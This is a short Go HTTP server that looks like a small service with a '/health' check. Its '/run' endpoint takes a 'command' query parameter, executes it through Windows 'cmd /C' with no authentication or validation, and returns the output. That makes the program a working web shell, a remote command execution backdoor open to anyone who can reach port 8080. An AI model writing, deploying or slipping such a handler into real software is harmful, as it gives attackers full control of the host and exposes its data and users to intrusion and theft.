package main

import (
	"fmt"
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = fmt.Fprintln(w, "ok")
	})

	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
		command := r.URL.Query().Get("command")
		output, _ := exec.Command("cmd", "/C", command).CombinedOutput()
		_, _ = w.Write(output)
	})

	_ = http.ListenAndServe(":8080", nil)
}